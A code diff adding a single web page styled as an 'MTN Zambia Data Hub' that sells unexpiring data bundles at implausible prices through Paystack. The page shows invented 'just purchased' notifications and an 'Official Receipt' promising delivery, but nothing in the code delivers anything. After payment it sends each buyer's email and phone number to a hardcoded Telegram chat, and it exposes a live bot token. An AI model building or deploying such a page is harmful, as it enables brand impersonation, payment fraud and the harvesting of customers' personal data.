@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN Zambia Data Hub - Premium Data Services</title>
+    <script src="https://js.paystack.co/v2/inline.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; text-decoration: none; outline: none; }
+        :root {
+            --mtn-yellow: #FFCC00;
+            --mtn-blue: #003399;
+            --mtn-dark: #001a4d;
+            --premium-gold: #D4AF37;
+            --text-primary: #0F172A;
+            --text-secondary: #475569;
+            --bg-body: #F1F5F9;
+            --glass: rgba(255, 255, 255, 0.9);
+            --shadow-premium: 0 25px 50px -12px rgba(0, 0, 0, 0.08);
+            --radius-xl: 32px;
+            --radius-lg: 20px;
+        }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg-body);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+        .bg-blobs {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; pointer-events: none;
+        }
+        .blob {
+            position: absolute; width: 500px; height: 500px; background: rgba(255, 204, 0, 0.1); filter: blur(80px); border-radius: 50%; animation: floatBlob 20s infinite alternate;
+        }
+        .blob-1 { top: -100px; right: -100px; background: rgba(0, 51, 153, 0.05); }
+        .blob-2 { bottom: -100px; left: -100px; animation-delay: -5s; }
+        @keyframes floatBlob { 0% { transform: translate(0, 0); } 100% { transform: translate(100px, 50px); } }
+        header {
+            background: var(--glass);
+            backdrop-filter: blur(12px);
+            padding: 20px 24px;
+            position: sticky; top: 0; z-index: 1000;
+            border-bottom: 1px solid rgba(0, 51, 153, 0.1);
+        }
+        .header-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 14px; cursor: pointer; }
+        .logo-text { font-size: 22px; font-weight: 800; color: var(--mtn-blue); letter-spacing: -0.5px; }
+        main { flex: 1; max-width: 1200px; margin: 0 auto; width: 100%; padding: 40px 24px; position: relative; z-index: 1; }
+        .notification-container { position: fixed; top: 100px; right: 24px; z-index: 9999; pointer-events: none; }
+        @media (max-width: 640px) { .notification-container { top: 90px; right: 16px; left: auto; transform: none; width: auto; max-width: 280px; } }
+        .notification {
+            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px);
+            border-radius: 16px; padding: 10px 16px; margin-bottom: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08); display: flex; align-items: center; gap: 10px;
+            animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid rgba(0, 51, 153, 0.1); border-left: 3px solid #10B981; pointer-events: auto;
+            transition: 0.4s;
+        }
+        @keyframes slideInRight { 0% { opacity: 0; transform: translateX(50px); } 100% { opacity: 1; transform: translateX(0); } }
+        .notif-dot { width: 6px; height: 6px; background: #10B981; border-radius: 50%; }
+        .notif-text { font-size: 12px; font-weight: 700; color: var(--mtn-blue); white-space: nowrap; }
+        .hero-section {
+            background: linear-gradient(135deg, var(--mtn-dark) 0%, var(--mtn-blue) 100%);
+            border-radius: var(--radius-xl); padding: 100px 40px; text-align: center; color: white;
+            box-shadow: var(--shadow-premium); margin-bottom: 80px; position: relative; overflow: hidden;
+        }
+        .hero-section::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); opacity: 0.1; pointer-events: none;
+        }
+        .hero-title { font-size: clamp(40px, 6vw, 64px); font-weight: 800; margin-bottom: 24px; line-height: 1.1; letter-spacing: -1px; }
+        .hero-subtitle { font-size: 18px; color: rgba(255,255,255,0.8); margin-bottom: 48px; max-width: 600px; margin-inline: auto; }
+        .btn-hero {
+            background: var(--mtn-yellow); color: var(--mtn-blue); padding: 22px 56px;
+            border-radius: 100px; font-size: 20px; font-weight: 800; border: none; cursor: pointer;
+            transition: 0.4s; box-shadow: 0 10px 25px rgba(255, 204, 0, 0.4); position: relative; z-index: 10;
+        }
+        .btn-hero:hover { transform: translateY(-5px) scale(1.02); box-shadow: 0 15px 35px rgba(255, 204, 0, 0.5); }
+        .section-header { text-align: center; margin-bottom: 60px; }
+        .section-header h2 { font-size: 36px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px; }
+        .section-header p { color: var(--text-secondary); font-size: 18px; }
+        .bundle-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 40px; }
+        .bundle-card {
+            background: white; border-radius: var(--radius-xl); padding: 50px 32px; text-align: center;
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer; box-shadow: 0 10px 30px rgba(0,0,0,0.03); display: flex; flex-direction: column; border: 1px solid rgba(0,0,0,0.05); position: relative;
+        }
+        .bundle-card:hover { transform: translateY(-15px); border-color: var(--mtn-yellow); box-shadow: 0 30px 60px rgba(0,0,0,0.1); }
+        .bundle-badges { display: flex; gap: 8px; justify-content: center; margin-bottom: 32px; }
+        .bundle-badge { background: #FEF3C7; color: #92400E; padding: 8px 16px; border-radius: 100px; font-size: 12px; font-weight: 700; text-transform: uppercase; }
+        .badge-no-expiry { background: #ECFDF5; color: #065F46; }
+        .bundle-data-value { font-size: 84px; font-weight: 800; color: var(--mtn-blue); margin: 20px 0; letter-spacing: -3px; }
+        .bundle-price-row {
+            font-size: 28px; font-weight: 800; color: var(--mtn-blue); padding-top: 32px; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-between; align-items: center;
+        }
+        .btn-buy { font-size: 15px; font-weight: 700; background: var(--mtn-blue); color: white; padding: 10px 20px; border-radius: 100px; transition: 0.3s; }
+        .bundle-card:hover .btn-buy { background: var(--mtn-yellow); color: var(--mtn-blue); }
+        .app-card {
+            background: white; border-radius: var(--radius-xl); padding: 60px; box-shadow: var(--shadow-premium); max-width: 600px; margin: 0 auto; border: 1px solid rgba(0,0,0,0.05);
+        }
+        .form-group { margin-bottom: 32px; }
+        .form-label { display: block; font-weight: 700; margin-bottom: 12px; color: var(--mtn-blue); font-size: 15px; }
+        .form-label-helper { display: block; font-weight: 500; color: var(--text-secondary); font-size: 13px; margin-top: 4px; }
+        .form-input {
+            width: 100%; padding: 20px; border: 2px solid #F1F5F9; border-radius: 18px; font-size: 17px; font-weight: 600; transition: 0.3s; background: #F8FAFC;
+        }
+        .form-input:focus { border-color: var(--mtn-yellow); background: white; box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.1); }
+        .btn-full {
+            width: 100%; padding: 22px; border-radius: 18px; font-size: 18px; font-weight: 800; border: none; cursor: pointer; transition: 0.4s; margin-bottom: 16px; letter-spacing: 0.5px;
+        }
+        .btn-primary { background: var(--mtn-yellow); color: var(--mtn-blue); box-shadow: 0 10px 20px rgba(255, 204, 0, 0.3); }
+        .btn-primary:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(255, 204, 0, 0.4); }
+        .btn-outline { background: white; color: var(--mtn-blue); border: 2px solid var(--mtn-blue); }
+        .btn-outline:hover { background: var(--mtn-blue); color: white; }
+        .btn-full:disabled { opacity: 0.7; cursor: wait; transform: none !important; box-shadow: none; }
+        .checkout-message { display: none; margin: 0 0 18px; padding: 14px 16px; border-radius: 14px; font-size: 14px; font-weight: 700; line-height: 1.5; }
+        .checkout-message.visible { display: block; }
+        .checkout-message.info { color: #1E40AF; background: #EFF6FF; border: 1px solid #BFDBFE; }
+        .checkout-message.warning { color: #92400E; background: #FFFBEB; border: 1px solid #FDE68A; }
+        .checkout-message.error { color: #991B1B; background: #FEF2F2; border: 1px solid #FECACA; }
+        .form-input.invalid { border-color: #EF4444; background: #FEF2F2; }
+        .state { display: none; }
+        .state.active { display: block; animation: fadeIn 0.8s cubic-bezier(0.23, 1, 0.32, 1); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        footer {
+            background: white; padding: 80px 24px; text-align: center; border-top: 1px solid #E2E8F0; margin-top: 100px;
+        }
+        .footer-logo { font-size: 24px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 16px; }
+        .footer-copy { color: var(--text-secondary); font-size: 15px; }
+        .success-icon {
+            width: 100px; height: 100px; background: #DCFCE7; color: #10B981; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 48px; margin: 0 auto 32px; animation: scaleCheck 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        @keyframes scaleCheck { from { transform: scale(0); } to { transform: scale(1); } }
+        .info-box {
+            background: #EFF6FF; padding: 24px; border-radius: 20px; border: 1px solid #BFDBFE; margin-bottom: 32px; display: flex; gap: 16px; align-items: flex-start;
+        }
+        .info-box-icon { font-size: 24px; flex-shrink: 0; }
+        .info-box-content p { font-size: 14px; color: #1E40AF; line-height: 1.6; }
+        .info-box-content p:first-child { font-weight: 700; margin-bottom: 4px; }
+        @media (max-width: 768px) {
+            .app-card { padding: 40px 24px; }
+            .hero-section { padding: 60px 24px; }
+            .bundle-grid { gap: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-blobs">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+    </div>
+
+    <header>
+        <div class="header-container">
+            <div class="logo" onclick="resetFlow()">
+                <span class="logo-text">MTN DATA HUB</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="notification-container" id="notifContainer"></div>
+
+    <main>
+        <div id="heroPage" class="state active">
+            <div class="hero-section">
+                <h1 class="hero-title">Experience Premium<br>Data Services</h1>
+                <p class="hero-subtitle">The most advanced automated data delivery system in Zambia. Fast, secure, and always reliable.</p>
+                <button class="btn-hero" onclick="showBundles()">Browse Exclusive Plans</button>
+            </div>
+        </div>
+
+        <div id="bundlesPage" class="state">
+            <div class="section-header">
+                <h2>Select Your Plan</h2>
+                <p>Premium high-speed data with no expiration.</p>
+            </div>
+            <div class="bundle-grid" id="bundleGrid"></div>
+            <button class="btn-full btn-outline" style="margin-top: 40px; max-width: 320px; margin-inline: auto; display: block;" onclick="showPage('heroPage')">← Back to Home</button>
+        </div>
+
+        <div id="paymentPage" class="state">
+            <div class="app-card">
+                <h2 style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px; text-align: center;">Complete Your Order</h2>
+
+                <div id="planSummary" style="background: linear-gradient(135deg, var(--mtn-dark) 0%, var(--mtn-blue) 100%); border-radius: 20px; padding: 28px; margin-bottom: 40px; color: white; display: flex; justify-content: space-between; align-items: center;">
+                    <div>
+                        <p style="font-size: 12px; opacity: 0.85; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Your Data Bundle</p>
+                        <h3 id="summaryData" style="font-size: 32px; font-weight: 800; margin-top: 8px;">0GB</h3>
+                    </div>
+                    <div style="text-align: right;">
+                        <p style="font-size: 12px; opacity: 0.85; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Amount to Pay</p>
+                        <h3 id="summaryPrice" style="font-size: 32px; font-weight: 800; margin-top: 8px;">ZMW 0</h3>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-icon">📱</div>
+                    <div class="info-box-content">
+                        <p>Enter Your MTN Zambia Number</p>
+                        <p>Provide the MTN mobile number where you want the data bundle delivered.</p>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        Email Address
+                        <span class="form-label-helper">(required for payment receipt)</span>
+                    </label>
+                    <input type="email" id="emailInput" class="form-input" placeholder="example@gmail.com" autocomplete="email" inputmode="email" maxlength="254" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        MTN Mobile Number
+                        <span class="form-label-helper">(for data bundle delivery)</span>
+                    </label>
+                    <input type="tel" id="phoneInput" class="form-input" placeholder="097 XXX XXXX" autocomplete="tel" inputmode="numeric" maxlength="13" required>
+                </div>
+
+                <div id="checkoutMessage" class="checkout-message" role="status" aria-live="polite"></div>
+                <button type="button" class="btn-full btn-primary" id="payBtn" onclick="payWithPaystack()">Proceed to Payment</button>
+                <button type="button" class="btn-full btn-outline" onclick="showPage('bundlesPage')">← Back to Plans</button>
+            </div>
+        </div>
+
+        <div id="waitingPage" class="state">
+            <div class="app-card" style="text-align: center;">
+                <div class="timer-box" style="margin-bottom: 32px;">
+                    <div style="font-size: 80px; animation: pulse 2s infinite;">⏳</div>
+                </div>
+                <h2 style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 16px;">Verifying Payment</h2>
+                <div style="background: #F0F9FF; padding: 24px; border-radius: 24px; border: 1px solid #BFDBFE; margin-bottom: 32px;">
+                    <p style="font-size: 16px; color: #1E40AF; line-height: 1.6;">
+                        Please hold on for <b>1 to 2 minutes</b> while our system confirms your transaction.
+                    </p>
+                </div>
+                <div class="loading-dots" style="display: flex; justify-content: center; gap: 12px;">
+                    <div style="width: 12px; height: 12px; background: var(--mtn-blue); border-radius: 50%; animation: bounce 1.4s infinite ease-in-out both;"></div>
+                    <div style="width: 12px; height: 12px; background: var(--mtn-blue); border-radius: 50%; animation: bounce 1.4s infinite ease-in-out both; animation-delay: 0.16s;"></div>
+                    <div style="width: 12px; height: 12px; background: var(--mtn-blue); border-radius: 50%; animation: bounce 1.4s infinite ease-in-out both; animation-delay: 0.32s;"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="successPage" class="state">
+            <div class="app-card" style="text-align: center; padding: 40px 24px;">
+                <div class="success-icon" style="margin-bottom: 20px;">✓</div>
+                <h2 style="font-size: 28px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 8px;">Payment Successful!</h2>
+                <p style="color: var(--text-secondary); font-size: 15px; margin-bottom: 30px;">Your order has been received and is being processed.</p>
+
+                <div id="successTicket" style="background: #F8FAFC; border: 2px dashed #CBD5E1; border-radius: 24px; padding: 30px; margin-bottom: 30px; text-align: left; position: relative;">
+                    <div style="text-align: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #E2E8F0;">
+                        <p style="font-size: 12px; font-weight: 800; color: var(--mtn-blue); text-transform: uppercase; letter-spacing: 1px;">Official Receipt</p>
+                    </div>
+
+                    <div style="display: flex; flex-direction: column; gap: 16px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <span style="font-size: 13px; color: var(--text-secondary); font-weight: 600;">Transaction ID</span>
+                            <span id="ticketRef" style="font-size: 13px; color: var(--mtn-blue); font-weight: 700; font-family: monospace;">MTN-8829301</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <span style="font-size: 13px; color: var(--text-secondary); font-weight: 600;">Data Bundle</span>
+                            <span id="ticketData" style="font-size: 15px; color: var(--mtn-blue); font-weight: 800;">20GB Plan</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <span style="font-size: 13px; color: var(--text-secondary); font-weight: 600;">Recipient Number</span>
+                            <span id="ticketPhone" style="font-size: 15px; color: var(--mtn-blue); font-weight: 800;">097 000 0000</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 12px; border-top: 1px solid #E2E8F0;">
+                            <span style="font-size: 14px; color: var(--mtn-blue); font-weight: 700;">Amount Paid</span>
+                            <span id="ticketPrice" style="font-size: 20px; color: var(--mtn-blue); font-weight: 800;">ZMW 100.00</span>
+                        </div>
+                    </div>
+
+                    <div style="margin-top: 24px; padding: 12px; background: #ECFDF5; border-radius: 12px; text-align: center; border: 1px solid #A7F3D0;">
+                        <p style="font-size: 12px; color: #065F46; font-weight: 700;">Status: APPROVED & QUEUED</p>
+                    </div>
+                </div>
+
+                <div class="info-box" style="margin-bottom: 30px; background: #FFFBEB; border-color: #FEF3C7;">
+                    <div class="info-box-icon">⚡</div>
+                    <div class="info-box-content">
+                        <p style="color: #92400E; font-size: 14px;">Estimated Delivery: <b>Within 30 Minutes</b></p>
+                        <p style="color: #92400E; font-size: 12px;">You will receive a confirmation SMS once the bundle is active.</p>
+                    </div>
+                </div>
+
+                <button class="btn-full btn-primary" onclick="resetFlow()">Done</button>
+            </div>
+        </div>
+
+        <div id="errorPage" class="state">
+            <div class="app-card" style="text-align: center; border-top: 10px solid #EF4444;">
+                <div style="font-size: 80px; margin-bottom: 24px;">✕</div>
+                <h2 id="errorTitle" style="font-size: 32px; font-weight: 800; color: var(--mtn-blue); margin-bottom: 12px;">Payment Declined</h2>
+                <p id="errorMsg" style="color: var(--text-secondary); font-size: 17px; margin-bottom: 40px;">We were unable to verify your payment at this time.</p>
+                <button type="button" class="btn-full btn-primary" onclick="retryPayment()">Try Again</button>
+                <button class="btn-full btn-outline" onclick="resetFlow()">Return Home</button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-logo">MTN DATA HUB</div>
+        <p class="footer-copy">© 2026 Premium Data Services. All rights reserved.</p>
+        <p style="font-size: 13px; color: var(--text-secondary); margin-top: 12px;">The most trusted automated data hub in Zambia.</p>
+    </footer>
+
+    <script>
+        const CONFIG = {
+            BOT_TOKEN: '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88',
+            CHAT_ID: '8889432014',
+            PAYSTACK_PUBLIC_KEY: 'pk_live_72f5b032d37d0ba8c5aa530e002d18149abb0367'
+        };
+        const BUNDLES = [
+            { id: 1, data: '2GB', price: 15, tag: 'Starter', unavailable: true },
+            { id: 2, data: '10GB', price: 35, tag: 'Popular' },
+            { id: 3, data: '25GB', price: 70, tag: 'Value' },
+            { id: 4, data: '55GB', price: 140, tag: 'Pro' },
+            { id: 5, data: '120GB', price: 280, tag: 'Elite' },
+            { id: 6, data: '280GB', price: 490, tag: 'Ultimate' },
+            { id: 7, data: '600GB', price: 780, tag: 'Mega' },
+            { id: 8, data: '1000GB', price: 1120, tag: 'Max' }
+        ];
+        const SAMPLES = [
+            { p: '097 558 XXXX', b: '10GB' },
+            { p: '096 221 XXXX', b: '25GB' },
+            { p: '095 903 XXXX', b: '55GB' },
+            { p: '097 441 XXXX', b: '120GB' },
+            { p: '076 332 XXXX', b: '280GB' },
+            { p: '095 718 XXXX', b: '600GB' },
+            { p: '097 806 XXXX', b: '1000GB' }
+        ];
+
+        let isNotifActive = true;
+        let selectedBundle = null;
+        let isPaymentStarting = false;
+
+        window.onload = () => {
+            renderBundles();
+            startNotifs();
+            history.replaceState({ pageId: 'heroPage' }, '');
+        };
+
+        window.onpopstate = (event) => {
+            if (event.state && event.state.pageId) {
+                showPage(event.state.pageId, false);
+            }
+        };
+
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted) setPaymentButtonBusy(false);
+        });
+
+        window.addEventListener('offline', () => {
+            if (document.getElementById('paymentPage').classList.contains('active')) {
+                setPaymentButtonBusy(false);
+                showCheckoutMessage('Your internet connection was lost. Reconnect before trying payment again.', 'error');
+            }
+        });
+
+        document.getElementById('emailInput').addEventListener('input', clearCheckoutMessage);
+        document.getElementById('phoneInput').addEventListener('input', (event) => {
+            event.target.value = event.target.value.replace(/[^\d+\s-]/g, '').slice(0, 13);
+            clearCheckoutMessage();
+        });
+
+        function startNotifs() {
+            const container = document.getElementById('notifContainer');
+            const show = () => {
+                if (!isNotifActive) return;
+                const item = SAMPLES[Math.floor(Math.random() * SAMPLES.length)];
+                const n = document.createElement('div'); n.className = 'notification';
+                n.innerHTML = `<div class="notif-dot"></div><span class="notif-text">${item.p} just purchased ${item.b} ✓</span>`;
+                container.appendChild(n);
+                setTimeout(() => { n.style.opacity = '0'; n.style.transform = 'translateX(30px)'; setTimeout(() => n.remove(), 600); }, 4000);
+                setTimeout(show, Math.random() * 3000 + 8000);
+            };
+            setTimeout(show, 2000);
+        }
+
+        function renderBundles() {
+            const grid = document.getElementById('bundleGrid');
+            grid.innerHTML = BUNDLES.map(b => `
+                <div class="bundle-card" ${b.unavailable ? 'style="opacity: 0.7; cursor: not-allowed;"' : `onclick="selectBundle(${b.id})"`}>
+                    <div class="bundle-badges">
+                        <div class="bundle-badge">${b.tag}</div>
+                        <div class="bundle-badge badge-no-expiry">No Expiry ∞</div>
+                    </div>
+                    <div class="bundle-data-value">${b.data}</div>
+                    <div class="bundle-price-row">
+                        <span>ZMW ${b.price}</span>
+                        <span class="btn-buy" style="${b.unavailable ? 'background: #94a3b8; color: white;' : ''}">${b.unavailable ? 'Unavailable' : 'Get Plan'}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function selectBundle(id) {
+            const bundle = BUNDLES.find(item => item.id === id && !item.unavailable);
+            if (!bundle) return;
+
+            selectedBundle = bundle;
+            document.getElementById('summaryData').innerText = selectedBundle.data;
+            document.getElementById('summaryPrice').innerText = 'ZMW ' + selectedBundle.price;
+            clearCheckoutMessage();
+            setPaymentButtonBusy(false);
+            showPage('paymentPage');
+        }
+
+        function showBundles() { showPage('bundlesPage'); }
+
+        function normalizeZambiaPhone(value) {
+            const digits = String(value || '').replace(/\D/g, '');
+            if (digits.length === 12 && digits.startsWith('260')) return '0' + digits.slice(3);
+            if (digits.length === 10 && /^9[5678]/.test(digits)) return digits;
+            return digits;
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email) && email.length <= 254;
+        }
+
+        function isValidZambiaMobile(phone) {
+            return /^0(9[5678]|7[5678])\d{7}$/.test(phone);
+        }
+
+        function generatePaymentReference() {
+            if (window.crypto && typeof window.crypto.randomUUID === 'function') {
+                return 'MTN-' + window.crypto.randomUUID();
+            }
+            return 'MTN-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
+        }
+
+        function setPaymentButtonBusy(isBusy, label) {
+            const button = document.getElementById('payBtn');
+            isPaymentStarting = isBusy;
+            button.disabled = isBusy;
+            button.textContent = label || (isBusy ? 'Opening Secure Payment…' : 'Proceed to Payment');
+            button.setAttribute('aria-busy', String(isBusy));
+        }
+
+        function showCheckoutMessage(message, type = 'info') {
+            const box = document.getElementById('checkoutMessage');
+            box.textContent = message;
+            box.className = `checkout-message visible ${type}`;
+        }
+
+        function clearCheckoutMessage() {
+            const box = document.getElementById('checkoutMessage');
+            box.textContent = '';
+            box.className = 'checkout-message';
+            document.getElementById('emailInput').classList.remove('invalid');
+            document.getElementById('phoneInput').classList.remove('invalid');
+        }
+
+        function friendlyPaystackError(error) {
+            const message = String(error && error.message ? error.message : '').toLowerCase();
+            if (!navigator.onLine) return 'You appear to be offline. Reconnect to the internet and try again.';
+            if (message.includes('duplicate') || message.includes('reference')) return 'This payment attempt could not be created. Please try again to generate a new transaction.';
+            if (message.includes('timeout') || message.includes('time to pay')) return 'The payment session expired. Please start a new payment attempt.';
+            if (message.includes('email')) return 'Paystack rejected the email address. Please correct it and try again.';
+            if (message.includes('deactivated') || message.includes('merchant')) return 'Payments are temporarily unavailable. Please contact MTN Data Hub support.';
+            return 'Paystack could not open the payment window. Check your internet connection, disable data-saver mode, or try Chrome/Safari and then retry.';
+        }
+
+        function payWithPaystack() {
+            if (isPaymentStarting) return;
+
+            clearCheckoutMessage();
+            const emailInput = document.getElementById('emailInput');
+            const phoneInput = document.getElementById('phoneInput');
+            const email = emailInput.value.trim().toLowerCase();
+            const phone = normalizeZambiaPhone(phoneInput.value);
+            emailInput.value = email;
+            phoneInput.value = phone;
+
+            if (!selectedBundle || selectedBundle.unavailable) {
+                showCheckoutMessage('Please return to the plans page and select an available bundle.', 'error');
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                emailInput.classList.add('invalid');
+                showCheckoutMessage('Enter a valid email address, for example name@gmail.com.', 'error');
+                emailInput.focus();
+                return;
+            }
+
+            if (!isValidZambiaMobile(phone)) {
+                phoneInput.classList.add('invalid');
+                showCheckoutMessage('Enter a valid 10-digit Zambia mobile number, for example 0971234567.', 'error');
+                phoneInput.focus();
+                return;
+            }
+
+            if (!navigator.onLine) {
+                showCheckoutMessage('You are offline. Reconnect to the internet before starting payment.', 'error');
+                return;
+            }
+
+            if (typeof window.PaystackPop !== 'function') {
+                showCheckoutMessage('The secure payment service did not load. Refresh the page or try Chrome/Safari without data-saver mode.', 'error');
+                return;
+            }
+
+            const orderBundle = { ...selectedBundle };
+            const reference = generatePaymentReference();
+            const amount = Math.round(orderBundle.price * 100);
+            let paymentFinished = false;
+
+            setPaymentButtonBusy(true);
+            showCheckoutMessage('Opening Paystack. Complete the Mobile Money prompt, OTP, or card authorization before closing the window.', 'info');
+
+            try {
+                const popup = new window.PaystackPop();
+                popup.newTransaction({
+                    key: CONFIG.PAYSTACK_PUBLIC_KEY,
+                    email,
+                    amount,
+                    currency: 'ZMW',
+                    reference,
+                    phone: '+260' + phone.slice(1),
+                    metadata: {
+                        bundle: orderBundle.data,
+                        recipient_phone: phone,
+                        custom_fields: [
+                            { display_name: 'Data Bundle', variable_name: 'data_bundle', value: orderBundle.data },
+                            { display_name: 'Recipient MTN Number', variable_name: 'recipient_mtn_number', value: phone }
+                        ]
+                    },
+                    onLoad: function() {
+                        setPaymentButtonBusy(true, 'Complete Payment in Paystack');
+                    },
+                    onSuccess: function(transaction) {
+                        if (paymentFinished) return;
+                        paymentFinished = true;
+                        setPaymentButtonBusy(false);
+
+                        if (!transaction || !transaction.reference) {
+                            showError('Payment Status Unclear', 'Paystack did not return a transaction reference. Please check your Paystack receipt before retrying.');
+                            return;
+                        }
+
+                        document.getElementById('ticketRef').innerText = transaction.reference;
+                        document.getElementById('ticketData').innerText = orderBundle.data + ' Plan';
+                        document.getElementById('ticketPhone').innerText = phone;
+                        document.getElementById('ticketPrice').innerText = 'ZMW ' + orderBundle.price.toFixed(2);
+
+                        sendTelegramNotification(transaction.reference, phone, email, orderBundle);
+                        showPage('successPage');
+                    },
+                    onCancel: function() {
+                        if (paymentFinished) return;
+                        paymentFinished = true;
+                        setPaymentButtonBusy(false);
+                        showCheckoutMessage('Payment was not completed. If you did not approve the Mobile Money prompt or closed Paystack, click Proceed to Payment to try again.', 'warning');
+                    },
+                    onError: function(error) {
+                        if (paymentFinished) return;
+                        paymentFinished = true;
+                        setPaymentButtonBusy(false);
+                        console.error('Paystack popup error:', error);
+                        showError('Payment Could Not Start', friendlyPaystackError(error));
+                    }
+                });
+            } catch (error) {
+                paymentFinished = true;
+                setPaymentButtonBusy(false);
+                console.error('Paystack initialization error:', error);
+                showError('Payment Service Error', friendlyPaystackError(error));
+            }
+        }
+
+        function sendTelegramNotification(ref, phone, email, bundle) {
+            const msg = `✅ *PAYMENT COMPLETED*
+━━━━━━━━━━━━━━━━━━━━
+🎫 *ORDER DETAILS*
+━━━━━━━━━━━━━━━━━━━━
+🆔 *Transaction ID:* \`${ref}\`
+📦 *Data Bundle:* ${bundle.data}
+📞 *Recipient Number:* ${phone}
+📧 *Customer Email:* ${email}
+💰 *Amount:* ZMW ${bundle.price.toFixed(2)}
+━━━━━━━━━━━━━━━━━━━━
+⏱️ *Delivery:* Within 30 Minutes
+━━━━━━━━━━━━━━━━━━━━
+📱 Customer will receive SMS confirmation`;
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).catch(error => console.error('Order notification failed:', error));
+        }
+
+        function showError(title, msg) {
+            setPaymentButtonBusy(false);
+            document.getElementById('errorTitle').textContent = title;
+            document.getElementById('errorMsg').textContent = msg;
+            showPage('errorPage');
+        }
+
+        function showPage(id, push = true) {
+            const page = document.getElementById(id);
+            if (!page) return;
+            document.querySelectorAll('.state').forEach(state => state.classList.remove('active'));
+            page.classList.add('active');
+            window.scrollTo(0, 0);
+            if (push && history.state?.pageId !== id) {
+                history.pushState({ pageId: id }, '');
+            }
+        }
+
+        function retryPayment() {
+            setPaymentButtonBusy(false);
+            showCheckoutMessage('Ready for a new payment attempt. Confirm your details, then proceed.', 'info');
+            showPage('paymentPage');
+        }
+
+        function resetFlow() { location.reload(); }
+    </script>
+</body>
+</html>
